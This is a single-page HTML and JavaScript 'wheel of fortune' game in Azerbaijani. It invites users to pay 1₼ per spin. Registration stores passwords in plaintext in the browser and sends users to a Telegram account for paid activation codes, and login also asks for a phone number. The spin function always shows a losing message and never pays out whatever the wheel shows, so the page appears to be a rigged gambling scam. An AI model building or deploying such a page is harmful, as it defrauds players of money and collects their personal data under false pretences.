<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<title>Çarx Oyunu</title>
<style>
body { font-family: Arial; text-align:center; background:#111; color:white; margin:0; padding:0; }
.container { max-width:400px; margin:auto; padding:20px; }
input, button { margin:10px auto; padding:12px; width:90%; font-size:18px; border-radius:8px; border:none; display:block; }
button { background:#333; color:white; cursor:pointer; transition:0.3s; }
button:hover { background:#555; }
#topMessage { background:#222; color:#FFD700; padding:10px; border-radius:8px; margin-bottom:15px; font-weight:bold; }
.hidden { display:none; }
#msg, #msgSpin, #regMsg { margin-top:10px; color:#FFD700; font-weight:bold; }

#wheel {
  margin:20px auto;
  width:250px;
  height:250px;
  border-radius:50%;
  border:5px solid white;
  position: relative;
  transition: transform 3s ease-out;
}

.slice {
  position:absolute;
  width:50%;
  height:50%;
  top:50%;
  left:50%;
  transform-origin:0% 0%;
  display:flex;
  justify-content:flex-start;
  align-items:flex-start;
}

.slice-text {
  transform: translate(50%, -50%) rotate(30deg); /* dilim ortasına yazı */
  font-weight:bold;
  font-size:14px;
  color:white;
}
#pointer { width:0; height:0; border-left:15px solid transparent; border-right:15px solid transparent; border-bottom:30px solid white; margin:-30px auto 0 auto; }
</style>
</head>
<body>

<div class="container">
<div id="topMessage">🎡 Çarxı fırlatmaq üçün 1₼ əlavə et və şansını sınayaraq qazan!</div>

<!-- LOGIN -->
<div id="login">
<h2>Giriş</h2>
<input id="loginUser" placeholder="İstifadəçi adı">
<input id="loginPass" type="password" placeholder="Şifrə">
<input id="loginCode" placeholder="Kod">
<button onclick="login()">Daxil ol</button>
<p id="msg"></p>
<p><button onclick="showRegister()">Qeydiyyatdan keç</button></p>
</div>

<!-- REGISTER -->
<div id="register" class="hidden">
<h2>Qeydiyyat</h2>
<input id="regUser" placeholder="İstifadəçi adı">
<input id="regEmail" placeholder="Email">
<input id="regPass" type="password" placeholder="Şifrə">
<button onclick="register()">Qeydiyyatdan keç</button>
<p id="regMsg"></p>
</div>

<!-- PANEL -->
<div id="panel" class="hidden">
<h2>Çarx Paneli</h2>
<p id="balanceText">Balans: 0 ₼</p>
<div id="pointer"></div>
<div id="wheel"></div>
<button onclick="spin()">Çarxi fırlat</button>
<p id="msgSpin"></p>
</div>

<script>
// GLOBALS
let deg = 0;
let balance = 0;
let userPhone = null;
let usedPhone = null;
const codeMap = { "005": 1, "00-MH":5, "00-7A":10, "00-6T":3, "00-63U":20 };

// Slice data
const slices = [
  { text:"1 ₼", color:"#ff4d4d" },
  { text:"5 ₼", color:"#4dff4d" },
  { text:"BOŞ", color:"#4d4dff" },
  { text:"BOŞ", color:"#ffff4d" },
  { text:"BOŞ", color:"#ff4dff" },
  { text:"BOŞ", color:"#4dffff" }
];

// DRAW WHEEL
function drawWheel(){
  const wheel = document.getElementById("wheel");
  wheel.innerHTML = "";
  const sliceDeg = 360 / slices.length;
  slices.forEach((slice, i)=>{
    const div = document.createElement("div");
    div.className="slice";
    div.style.background=slice.color;
    div.style.transform=`rotate(${i*sliceDeg}deg) skewY(-60deg)`;
    
    const span = document.createElement("span");
    span.className="slice-text";
    span.innerText=slice.text;
    span.style.transform=`rotate(${sliceDeg/2}deg)`; // ortada görünməsi üçün
    div.appendChild(span);
    wheel.appendChild(div);
  });
}

// INIT
drawWheel();

// SHOW REGISTER
function showRegister(){
  document.getElementById("login").classList.add("hidden");
  document.getElementById("register").classList.remove("hidden");
}

// REGISTER
function register(){
  let user = document.getElementById("regUser").value.trim();
  let email = document.getElementById("regEmail").value.trim();
  let pass = document.getElementById("regPass").value.trim();
  if(!user || !email || !pass){ document.getElementById("regMsg").innerText="Bütün xanaları doldur!"; return; }
  localStorage.setItem("userData", JSON.stringify({user,email,pass}));
  document.getElementById("regMsg").innerText="Qeydiyyat tamamlandı! Hesabınızı aktiv etmək üçün Telegramda bizə yazın.";
  let message = `Mən qeydiyyatdan keçdim, hesabımı aktiv edin.\nİstifadəçi adı: ${user}\nEmail: ${email}`;
  window.open("https://t.me/carxfirla?text=" + encodeURIComponent(message), "_blank");
}

// LOGIN
function login(){
  let user = document.getElementById("loginUser").value.trim();
  let pass = document.getElementById("loginPass").value.trim();
  let code = document.getElementById("loginCode").value.trim();
  let msg = document.getElementById("msg");

  if(!user || !pass || !code){ msg.innerText="Bütün xanaları doldurun!"; return; }
  if(!codeMap[code]){ msg.innerText="Kod səhvdir. Yeni kod üçün Telegram vasitəsilə əlaqə saxlayın."; return; }

  if(!userPhone){ userPhone=prompt("Telefon nömrənizi daxil edin:"); usedPhone=userPhone; }
  else if(userPhone!==usedPhone){ balance=0; msg.innerText="Bu kod yalnız sizin telefonunuz üçün aktivdir. Balans 0 göstərilir."; return; }

  balance = codeMap[code];
  document.getElementById("login").classList.add("hidden");
  document.getElementById("register").classList.add("hidden");
  document.getElementById("panel").classList.remove("hidden");
  document.getElementById("msg").innerText="Giriş uğurlu! Çarx paneli açıldı.";
  updateBalance();
}

// UPDATE BALANCE
function updateBalance(){ document.getElementById("balanceText").innerText="Balans: "+balance+" ₼"; }

// SPIN
function spin(){
  deg += 360*5 + Math.floor(Math.random()*360);
  document.getElementById("wheel").style.transform="rotate("+deg+"deg)";
  setTimeout(()=>{
    document.getElementById("msgSpin").innerText="Bəxtinizi Bir Daha Sınaayın 😞";
  },3000);
}
</script>

</body>
</html>
